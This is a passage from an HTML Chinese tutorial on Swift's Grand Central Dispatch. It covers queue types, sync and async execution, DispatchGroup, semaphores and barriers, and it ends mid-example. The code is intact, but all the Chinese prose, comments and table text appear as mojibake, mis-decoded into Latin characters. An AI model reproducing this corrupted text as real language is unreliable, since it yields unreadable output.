<li>å¼€å‘è€…ä¸éœ€è¦ç›´æ¥ç®¡ç†çº¿ç¨‹</li>
</ul>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… ç®€å•æ˜“ç”¨ï¼ŒAPI ç®€æ´</li>
<li>âœ… è‡ªåŠ¨ç®¡ç†çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸ</li>
<li>âœ… æ€§èƒ½ä¼˜ç§€ï¼Œå……åˆ†åˆ©ç”¨å¤šæ ¸ CPU</li>
<li>âœ… çº¿ç¨‹å®‰å…¨ï¼Œå‡å°‘ç«æ€æ¡ä»¶</li>
</ul>
<hr/>
<h4 data-id="heading-36">2. æ ¸å¿ƒæ¦‚å¿µ</h4>
<h5 data-id="heading-37">é˜Ÿåˆ—ï¼ˆQueueï¼‰</h5>
<p>é˜Ÿåˆ—æ˜¯ä»»åŠ¡çš„å®¹å™¨ï¼ŒæŒ‰ç…§ FIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰çš„é¡ºåºç®¡ç†ä»»åŠ¡ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// é˜Ÿåˆ—åªæ˜¯ä»»åŠ¡çš„å®¹å™¨ï¼Œä¸æ˜¯çº¿ç¨‹</span>
<span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"com.example.queue"</span>)
</code></pre>
<h5 data-id="heading-38">ä»»åŠ¡ï¼ˆTaskï¼‰</h5>
<p>éœ€è¦æ‰§è¡Œçš„ä»£ç å—ï¼Œé€šå¸¸æ˜¯é—­åŒ…ã€‚</p>
<pre><code class="hljs language-swift" lang="swift">queue.async {
    <span class="hljs-comment">// è¿™æ˜¯ä»»åŠ¡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>)
}
</code></pre>
<h5 data-id="heading-39">çº¿ç¨‹ï¼ˆThreadï¼‰</h5>
<p>å®é™…æ‰§è¡Œä»»åŠ¡çš„æ‰§è¡Œå•å…ƒï¼Œç”±ç³»ç»Ÿç®¡ç†ã€‚</p>
<pre><code class="hljs">é˜Ÿåˆ— â†’ ä»»åŠ¡ â†’ çº¿ç¨‹æ‰§è¡Œ
</code></pre>
<hr/>
<h3 data-id="heading-40">äºŒã€é˜Ÿåˆ—ç±»å‹è¯¦è§£</h3>
<h4 data-id="heading-41">1. ä¸²è¡Œé˜Ÿåˆ—ï¼ˆSerial Queueï¼‰</h4>
<h5 data-id="heading-42">å®šä¹‰</h5>
<p>ä¸²è¡Œé˜Ÿåˆ—ä¸€æ¬¡åªæ‰§è¡Œä¸€ä¸ªä»»åŠ¡ï¼Œä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä¸²è¡Œé˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"com.example.serial"</span>)
</code></pre>
<h5 data-id="heading-43">ç‰¹ç‚¹</h5>
<ul>
<li>âœ… <strong>é¡ºåºæ‰§è¡Œ</strong>ï¼šä»»åŠ¡æŒ‰æ·»åŠ é¡ºåºä¾æ¬¡æ‰§è¡Œ</li>
<li>âœ… <strong>å•çº¿ç¨‹æ‰§è¡Œ</strong>ï¼šåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªä»»åŠ¡åœ¨æ‰§è¡Œ</li>
<li>âœ… <strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šå¤©ç„¶ä¿è¯ä»»åŠ¡æ‰§è¡Œçš„é¡ºåºæ€§</li>
</ul>
<h5 data-id="heading-44">ä»£ç ç¤ºä¾‹</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"serial"</span>)

serialQueue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1å¼€å§‹"</span>)
    sleep(<span class="hljs-number">2</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1ç»“æŸ"</span>)
}

serialQueue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2ç»“æŸ"</span>)
}

<span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼ˆå›ºå®šï¼‰ï¼š</span>
<span class="hljs-comment">// ä»»åŠ¡1å¼€å§‹</span>
<span class="hljs-comment">// ä»»åŠ¡1ç»“æŸ</span>
<span class="hljs-comment">// ä»»åŠ¡2å¼€å§‹</span>
<span class="hljs-comment">// ä»»åŠ¡2ç»“æŸ</span>
</code></pre>
<h5 data-id="heading-45">åº”ç”¨åœºæ™¯</h5>
<ul>
<li>UI æ›´æ–°ï¼ˆä¸»é˜Ÿåˆ—ï¼‰</li>
<li>çº¿ç¨‹å®‰å…¨çš„æ•°æ®è®¿é—®</li>
<li>éœ€è¦ä¸¥æ ¼é¡ºåºæ‰§è¡Œçš„ä»»åŠ¡</li>
<li>æ—¥å¿—è®°å½•</li>
</ul>
<hr/>
<h4 data-id="heading-46">2. å¹¶è¡Œé˜Ÿåˆ—ï¼ˆConcurrent Queueï¼‰</h4>
<h5 data-id="heading-47">å®šä¹‰</h5>
<p>å¹¶è¡Œé˜Ÿåˆ—å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼Œå……åˆ†åˆ©ç”¨å¤šæ ¸ CPUã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºå¹¶è¡Œé˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> concurrentQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(
    label: <span class="hljs-string">"com.example.concurrent"</span>,
    attributes: .concurrent
)
</code></pre>
<h5 data-id="heading-48">ç‰¹ç‚¹</h5>
<ul>
<li>âœ… <strong>å¹¶å‘æ‰§è¡Œ</strong>ï¼šå¤šä¸ªä»»åŠ¡å¯ä»¥åŒæ—¶åœ¨ä¸åŒçº¿ç¨‹ä¸Šæ‰§è¡Œ</li>
<li>âœ… <strong>æ€§èƒ½é«˜</strong>ï¼šå……åˆ†åˆ©ç”¨å¤šæ ¸ CPU</li>
<li>âš ï¸ <strong>å®Œæˆé¡ºåºä¸ç¡®å®š</strong>ï¼šä»»åŠ¡å¼€å§‹é¡ºåºç¡®å®šï¼Œä½†å®Œæˆé¡ºåºå¯èƒ½ä¸åŒ</li>
</ul>
<h5 data-id="heading-49">ä»£ç ç¤ºä¾‹</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> concurrentQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(
    label: <span class="hljs-string">"concurrent"</span>,
    attributes: .concurrent
)

concurrentQueue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1å¼€å§‹"</span>)
    sleep(<span class="hljs-number">2</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1ç»“æŸ"</span>)
}

concurrentQueue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2ç»“æŸ"</span>)
}

<span class="hljs-comment">// å¯èƒ½çš„è¾“å‡ºï¼ˆä¸ç¡®å®šï¼‰ï¼š</span>
<span class="hljs-comment">// ä»»åŠ¡1å¼€å§‹</span>
<span class="hljs-comment">// ä»»åŠ¡2å¼€å§‹</span>
<span class="hljs-comment">// ä»»åŠ¡2ç»“æŸ  (1ç§’å)</span>
<span class="hljs-comment">// ä»»åŠ¡1ç»“æŸ  (2ç§’å)</span>
</code></pre>
<h5 data-id="heading-50">åº”ç”¨åœºæ™¯</h5>
<ul>
<li>å¤šå›¾ç‰‡ä¸‹è½½</li>
<li>æ•°æ®å¤„ç†</li>
<li>ç½‘ç»œè¯·æ±‚å¹¶å‘</li>
<li>CPU å¯†é›†å‹ä»»åŠ¡</li>
</ul>
<hr/>
<h4 data-id="heading-51">3. ç³»ç»Ÿé˜Ÿåˆ—</h4>
<h5 data-id="heading-52">ä¸»é˜Ÿåˆ—ï¼ˆMain Queueï¼‰</h5>
<p>ä¸»é˜Ÿåˆ—æ˜¯ä¸²è¡Œé˜Ÿåˆ—ï¼Œæ‰€æœ‰ä»»åŠ¡åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// è·å–ä¸»é˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> mainQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.main

<span class="hljs-comment">// æ‰€æœ‰ UI æ“ä½œå¿…é¡»åœ¨ä¸»é˜Ÿåˆ—æ‰§è¡Œ</span>
<span class="hljs-type">DispatchQueue</span>.main.async {
    <span class="hljs-keyword">self</span>.imageView.image <span class="hljs-operator">=</span> image
    <span class="hljs-keyword">self</span>.tableView.reloadData()
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸²è¡Œé˜Ÿåˆ—</li>
<li>æ‰€æœ‰ä»»åŠ¡åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ</li>
<li>ç”¨äº UI æ›´æ–°</li>
</ul>
<p><strong>âš ï¸ æ³¨æ„ï¼š</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ æ­»é”ï¼šåœ¨ä¸»çº¿ç¨‹åŒæ­¥è°ƒç”¨ä¸»é˜Ÿåˆ—</span>
<span class="hljs-type">DispatchQueue</span>.main.sync {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ"</span>)
}
</code></pre>
<h5 data-id="heading-53">å…¨å±€é˜Ÿåˆ—ï¼ˆGlobal Queueï¼‰</h5>
<p>å…¨å±€é˜Ÿåˆ—æ˜¯å¹¶è¡Œé˜Ÿåˆ—ï¼Œç³»ç»Ÿæä¾›çš„å…¨å±€å¹¶å‘é˜Ÿåˆ—ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// è·å–å…¨å±€é˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> globalQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global()

<span class="hljs-comment">// æŒ‡å®šä¼˜å…ˆçº§</span>
<span class="hljs-keyword">let</span> highQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global(qos: .userInteractive)
<span class="hljs-keyword">let</span> defaultQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global(qos: .default)
<span class="hljs-keyword">let</span> backgroundQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global(qos: .background)
</code></pre>
<p><strong>ä¼˜å…ˆçº§ï¼ˆQoS - Quality of Serviceï¼‰ï¼š</strong></p>








































<table><thead><tr><th>QoS</th><th>è¯´æ˜</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>.userInteractive</code></td><td>ç”¨æˆ·äº¤äº’</td><td>åŠ¨ç”»ã€UI æ›´æ–°</td></tr><tr><td><code>.userInitiated</code></td><td>ç”¨æˆ·å‘èµ·</td><td>ç”¨æˆ·æ“ä½œè§¦å‘çš„ä»»åŠ¡</td></tr><tr><td><code>.default</code></td><td>é»˜è®¤</td><td>ä¸€èˆ¬ä»»åŠ¡</td></tr><tr><td><code>.utility</code></td><td>å®ç”¨å·¥å…·</td><td>ä¸‹è½½ã€æ•°æ®å¤„ç†</td></tr><tr><td><code>.background</code></td><td>åå°</td><td>åå°ä»»åŠ¡</td></tr><tr><td><code>.unspecified</code></td><td>æœªæŒ‡å®š</td><td>ä¸æ¨èä½¿ç”¨</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-54">ä¸‰ã€æ‰§è¡Œæ–¹å¼è¯¦è§£</h3>
<h4 data-id="heading-55">1. åŒæ­¥æ‰§è¡Œï¼ˆsyncï¼‰</h4>
<h5 data-id="heading-56">å®šä¹‰</h5>
<p>åŒæ­¥æ‰§è¡Œä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç­‰å¾…ä»»åŠ¡å®Œæˆåæ‰ç»§ç»­æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-swift" lang="swift">queue.sync {
    <span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>)
}
<span class="hljs-comment">// è¿™è¡Œä»£ç ä¼šç­‰å¾…ä¸Šé¢çš„ä»»åŠ¡å®Œæˆæ‰æ‰§è¡Œ</span>
</code></pre>
<h5 data-id="heading-57">ç‰¹ç‚¹</h5>
<ul>
<li>âœ… <strong>é˜»å¡å½“å‰çº¿ç¨‹</strong>ï¼šç­‰å¾…ä»»åŠ¡å®Œæˆ</li>
<li>âœ… <strong>å¯ä»¥è·å–è¿”å›å€¼</strong>ï¼šä»»åŠ¡å®Œæˆåè¿”å›ç»“æœ</li>
<li>âš ï¸ <strong>å¯èƒ½æ­»é”</strong>ï¼šåœ¨ä¸²è¡Œé˜Ÿåˆ—ä¸­åµŒå¥—ä½¿ç”¨è¦å°å¿ƒ</li>
</ul>
<h5 data-id="heading-58">ä»£ç ç¤ºä¾‹</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"example"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å¼€å§‹"</span>)
queue.sync {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œä¸­"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>)
}
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“æŸ"</span>)

<span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼ˆç¡®å®šï¼‰ï¼š</span>
<span class="hljs-comment">// å¼€å§‹</span>
<span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œä¸­</span>
<span class="hljs-comment">// ä»»åŠ¡å®Œæˆ</span>
<span class="hljs-comment">// ç»“æŸ</span>
</code></pre>
<h5 data-id="heading-59">åº”ç”¨åœºæ™¯</h5>
<ul>
<li>éœ€è¦ç­‰å¾…ä»»åŠ¡å®Œæˆå†ç»§ç»­</li>
<li>éœ€è¦è·å–ä»»åŠ¡çš„è¿”å›å€¼</li>
<li>ä¸²è¡ŒåŒ–è®¿é—®å…±äº«èµ„æº</li>
</ul>
<hr/>
<h4 data-id="heading-60">2. å¼‚æ­¥æ‰§è¡Œï¼ˆasyncï¼‰</h4>
<h5 data-id="heading-61">å®šä¹‰</h5>
<p>å¼‚æ­¥æ‰§è¡Œä¸é˜»å¡å½“å‰çº¿ç¨‹ï¼Œç«‹å³è¿”å›ï¼Œä»»åŠ¡ç¨åæ‰§è¡Œã€‚</p>
<pre><code class="hljs language-swift" lang="swift">queue.async {
    <span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>)
}
<span class="hljs-comment">// è¿™è¡Œä»£ç ç«‹å³æ‰§è¡Œï¼Œä¸ç­‰å¾…ä¸Šé¢çš„ä»»åŠ¡</span>
</code></pre>
<h5 data-id="heading-62">ç‰¹ç‚¹</h5>
<ul>
<li>âœ… <strong>ä¸é˜»å¡å½“å‰çº¿ç¨‹</strong>ï¼šç«‹å³è¿”å›</li>
<li>âœ… <strong>æé«˜å“åº”æ€§</strong>ï¼šUI ä¸ä¼šè¢«é˜»å¡</li>
<li>âœ… <strong>æ¨èä½¿ç”¨</strong>ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨ async</li>
</ul>
<h5 data-id="heading-63">ä»£ç ç¤ºä¾‹</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"example"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å¼€å§‹"</span>)
queue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œä¸­"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>)
}
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“æŸ"</span>)

<span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼ˆå¯èƒ½ï¼‰ï¼š</span>
<span class="hljs-comment">// å¼€å§‹</span>
<span class="hljs-comment">// ç»“æŸ  â† ç«‹å³æ‰§è¡Œ</span>
<span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œä¸­</span>
<span class="hljs-comment">// ä»»åŠ¡å®Œæˆ</span>
</code></pre>
<h5 data-id="heading-64">åº”ç”¨åœºæ™¯</h5>
<ul>
<li><strong>å¤§å¤šæ•°æƒ…å†µ</strong>ï¼šæ¨èä½¿ç”¨</li>
<li>ä¸é˜»å¡ UI çº¿ç¨‹</li>
<li>åå°å¤„ç†ä»»åŠ¡</li>
<li>æé«˜å“åº”æ€§</li>
</ul>
<hr/>
<h3 data-id="heading-65">å››ã€ç»„åˆä½¿ç”¨</h3>
<h4 data-id="heading-66">1. å››ç§ç»„åˆæ–¹å¼</h4>








































<table><thead><tr><th>é˜Ÿåˆ—ç±»å‹</th><th>æ‰§è¡Œæ–¹å¼</th><th>ä»£ç ç¤ºä¾‹</th><th>è¯´æ˜</th><th>æ­»é”é£é™©</th></tr></thead><tbody><tr><td>ä¸²è¡Œé˜Ÿåˆ—</td><td>sync</td><td><code>serialQueue.sync { }</code></td><td>é˜»å¡ç­‰å¾…ï¼ŒæŒ‰é¡ºåºæ‰§è¡Œ</td><td>âš ï¸ é«˜ï¼ˆåµŒå¥—ï¼‰</td></tr><tr><td>ä¸²è¡Œé˜Ÿåˆ—</td><td>async</td><td><code>serialQueue.async { }</code></td><td>ä¸é˜»å¡ï¼ŒæŒ‰é¡ºåºæ‰§è¡Œ</td><td>âœ… ä½</td></tr><tr><td>å¹¶è¡Œé˜Ÿåˆ—</td><td>sync</td><td><code>concurrentQueue.sync { }</code></td><td>é˜»å¡ç­‰å¾…ï¼Œå¹¶å‘æ‰§è¡Œ</td><td>âœ… ä½</td></tr><tr><td>å¹¶è¡Œé˜Ÿåˆ—</td><td>async</td><td><code>concurrentQueue.async { }</code></td><td>ä¸é˜»å¡ï¼Œå¹¶å‘æ‰§è¡Œ</td><td>âœ… ä½</td></tr></tbody></table>
<h4 data-id="heading-67">2. å®é™…åº”ç”¨ç¤ºä¾‹</h4>
<h5 data-id="heading-68">ç¤ºä¾‹1ï¼šå›¾ç‰‡ä¸‹è½½ï¼ˆå¹¶è¡Œé˜Ÿåˆ— + asyncï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> imageQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"image"</span>, attributes: .concurrent)
<span class="hljs-keyword">let</span> imageURLs <span class="hljs-operator">=</span> [<span class="hljs-string">"url1"</span>, <span class="hljs-string">"url2"</span>, <span class="hljs-string">"url3"</span>]

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> imageURLs {
    imageQueue.async {
        <span class="hljs-comment">// ä¸‹è½½å›¾ç‰‡</span>
        downloadImage(from: url)
    }
}
</code></pre>
<h5 data-id="heading-69">ç¤ºä¾‹2ï¼šæ•°æ®è®¿é—®ï¼ˆä¸²è¡Œé˜Ÿåˆ— + syncï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"data"</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> data: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">addItem</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">item</span>: <span class="hljs-type">String</span>) {
        serialQueue.async {
            <span class="hljs-keyword">self</span>.data.append(item)
        }
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">getItems</span>() -&gt; [<span class="hljs-type">String</span>] {
        <span class="hljs-keyword">return</span> serialQueue.sync {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.data
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-70">äº”ã€GCD é«˜çº§ç‰¹æ€§</h3>
<h4 data-id="heading-71">1. DispatchGroupï¼ˆä»»åŠ¡ç»„ï¼‰</h4>
<h5 data-id="heading-72">å®šä¹‰</h5>
<p>ç”¨äºç®¡ç†å¤šä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆã€‚</p>
<h5 data-id="heading-73">åŸºæœ¬ä½¿ç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
<span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global()

<span class="hljs-comment">// æ·»åŠ ä»»åŠ¡åˆ°ç»„</span>
group.enter()
queue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1"</span>)
    group.leave()
}

group.enter()
queue.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2"</span>)
    group.leave()
}

<span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span>
group.notify(queue: .main) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰ä»»åŠ¡å®Œæˆ"</span>)
}
</code></pre>
<h5 data-id="heading-74">å®é™…åº”ç”¨ï¼šå¤šå›¾ç‰‡ä¸‹è½½</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
<span class="hljs-keyword">let</span> imageURLs <span class="hljs-operator">=</span> [<span class="hljs-string">"url1"</span>, <span class="hljs-string">"url2"</span>, <span class="hljs-string">"url3"</span>]

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> imageURLs {
    group.enter()
    <span class="hljs-type">DispatchQueue</span>.global().async {
        downloadImage(from: url) { image <span class="hljs-keyword">in</span>
            <span class="hljs-comment">// å¤„ç†å›¾ç‰‡</span>
            group.leave()
        }
    }
}

group.notify(queue: .main) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰å›¾ç‰‡ä¸‹è½½å®Œæˆ"</span>)
    <span class="hljs-keyword">self</span>.tableView.reloadData()
}
</code></pre>
<h5 data-id="heading-75">ç­‰å¾…ä»»åŠ¡å®Œæˆ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()

group.enter()
queue.async {
    <span class="hljs-comment">// ä»»åŠ¡</span>
    group.leave()
}

<span class="hljs-comment">// é˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span>
group.wait()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰ä»»åŠ¡å®Œæˆ"</span>)
</code></pre>
<hr/>
<h4 data-id="heading-76">2. DispatchSemaphoreï¼ˆä¿¡å·é‡ï¼‰</h4>
<h5 data-id="heading-77">å®šä¹‰</h5>
<p>ç”¨äºæ§åˆ¶å¹¶å‘æ•°é‡ï¼Œé™åˆ¶åŒæ—¶æ‰§è¡Œçš„ä»»åŠ¡æ•°ã€‚</p>
<h5 data-id="heading-78">åŸºæœ¬ä½¿ç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä¿¡å·é‡ï¼Œåˆå§‹å€¼ä¸ºæœ€å¤§å¹¶å‘æ•°</span>
<span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">3</span>)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">10</span> {
    <span class="hljs-type">DispatchQueue</span>.global().async {
        <span class="hljs-comment">// ç­‰å¾…ä¿¡å·é‡</span>
        semaphore.wait()
        
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡ <span class="hljs-subst">\(i)</span> å¼€å§‹"</span>)
        sleep(<span class="hljs-number">1</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡ <span class="hljs-subst">\(i)</span> ç»“æŸ"</span>)
        
        <span class="hljs-comment">// é‡Šæ”¾ä¿¡å·é‡</span>
        semaphore.signal()
    }
}

<span class="hljs-comment">// æœ€å¤šåŒæ—¶æ‰§è¡Œ 3 ä¸ªä»»åŠ¡</span>
</code></pre>
<h5 data-id="heading-79">å®é™…åº”ç”¨ï¼šæ§åˆ¶ç½‘ç»œè¯·æ±‚å¹¶å‘æ•°</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">5</span>)  <span class="hljs-comment">// æœ€å¤š5ä¸ªå¹¶å‘è¯·æ±‚</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">url</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">Data</span>?) -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-type">DispatchQueue</span>.global().async {
            <span class="hljs-keyword">self</span>.semaphore.wait()
            
            <span class="hljs-comment">// ç½‘ç»œè¯·æ±‚</span>
            <span class="hljs-type">URLSession</span>.shared.dataTask(with: <span class="hljs-type">URL</span>(string: url)<span class="hljs-operator">!</span>) { data, <span class="hljs-keyword">_</span>, <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
                completion(data)
                <span class="hljs-keyword">self</span>.semaphore.signal()
            }.resume()
        }
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-80">3. DispatchBarrierï¼ˆæ …æ ä»»åŠ¡ï¼‰- æ§åˆ¶ä»»åŠ¡ä¾èµ–å’Œæ‰§è¡Œé¡ºåº</h4>
<h5 data-id="heading-81">å®šä¹‰</h5>
<p><strong>DispatchBarrierï¼ˆæ …æ ä»»åŠ¡ï¼‰</strong> æ˜¯ GCD ä¸­ç”¨äºæ§åˆ¶ä»»åŠ¡æ‰§è¡Œé¡ºåºçš„é‡è¦æ–¹æ³•ã€‚åœ¨å¹¶è¡Œé˜Ÿåˆ—ä¸­ï¼š</p>
<ul>
<li>æ …æ ä»»åŠ¡ä¼š<strong>ç­‰å¾…å‰é¢çš„æ‰€æœ‰ä»»åŠ¡å®Œæˆ</strong></li>
<li>ç„¶å<strong>æ‰§è¡Œæ …æ ä»»åŠ¡</strong></li>
<li>æ …æ ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œ<strong>é˜»å¡åé¢çš„ä»»åŠ¡</strong></li>
<li>æ …æ ä»»åŠ¡å®Œæˆåï¼Œ<strong>åé¢çš„ä»»åŠ¡æ‰èƒ½æ‰§è¡Œ</strong></li>
</ul>
<p><strong>æ ¸å¿ƒä½œç”¨ï¼š</strong> åœ¨å¹¶è¡Œé˜Ÿåˆ—ä¸­åˆ›å»ºä¸€ä¸ª"åˆ†ç•Œç‚¹"ï¼Œç¡®ä¿æ …æ å‰åçš„ä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œã€‚</p>
<h5 data-id="heading-82">åŸºæœ¬ä½¿ç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> concurrentQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(
    label: <span class="hljs-string">"concurrent"</span>,
    attributes: .concurrent
)

<span class="hljs-comment">// æ …æ å‰çš„ä»»åŠ¡ï¼šå¹¶å‘æ‰§è¡Œ</span>
concurrentQueue.async { 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
